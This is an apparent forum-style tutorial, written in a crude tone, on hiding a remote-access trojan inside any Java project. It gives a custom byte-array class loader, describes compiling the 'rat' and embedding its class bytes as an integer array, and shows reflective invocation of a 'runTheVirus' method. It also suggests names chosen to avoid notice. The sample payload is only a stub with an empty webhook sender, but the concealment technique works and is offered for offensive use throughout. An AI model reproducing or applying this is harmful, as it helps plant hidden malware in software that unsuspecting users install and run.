## How to implement class loader rat / resouce cache rat in 5 minutes or less in any java projects
Since my previous writeup is so hard and yall r lazy fucks
- First we need a byte class loader, just copy paste this shit into your project.
```java
public static class ByteClassLoader extends ClassLoader {
        private HashMap<String, byte[]> byteDataMap = new HashMap<>();

        public ByteClassLoader(ClassLoader parent) {
            super(parent);
        }

        public void loadDataInBytes(byte[] byteData, String resourcesName) {
            byteDataMap.put(resourcesName, byteData);
        }

        @Override
        protected Class<?> findClass(String className) throws ClassNotFoundException {
            if (byteDataMap.isEmpty())
                throw new ClassNotFoundException("byte data is empty");

            String filePath = className.replaceAll("\\.", "/").concat(".class");
            byte[] extractedBytes = byteDataMap.get(filePath);
            if (extractedBytes == null)
                throw new ClassNotFoundException("Cannot find " + filePath + " in bytes");

            return defineClass(className, extractedBytes, 0, extractedBytes.length);
        }
    }
}
```
## Creating bytes (da rat)
- Create a java file containing your nasty rat and then compile it turning the `.java` file to `.class` file
using **javac <filename.java>** in [CMD]()
- Open the class file using notepad and copy it. And then [translate](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) it to bytes
- Set number delimiter to `Comma`


Java file example :

```java
package test;

public class Test {
    
    public static void runTheVirus() {
        System.out.println("Hello World");
        sendWebhook("test","zawebhook");
    }
    public static void sendWebhook(String message, String webhook) {
        //write za rat
    }
}
```
**PLEASE REMEMBER THAT YOU NEED TO COMPILE IT TO `.class` FOLLOW ALL THE STEPS ABOVE THE CODE SAMPLE**
## Implementing da rat
Basically initializing a `ByteClassLoader` instance and running it.
```java
    public static void main(String[] args) throws Exception {
        int[] bytes = { put bytes here };
        byte[] bytes1 = new byte[bytes.length];
        // this seems retarded but only way to make it work
        for (int i = 0; i < bytes.length; i++) {
            bytes1[i] = (byte)bytes[i];
        }
        ByteClassLoader byteClassLoader = new ByteClassLoader(ClassLoader.getSystemClassLoader());
        byteClassLoader.loadDataInBytes(bytes1, "test.Test");

        Class<?> clazz = byteClassLoader.loadClass("test.Test");
        clazz.getMethod("runTheVirus").invoke(null);
        // name the method whatever u want no obvious tho
}
```
i aint reading allat but we up
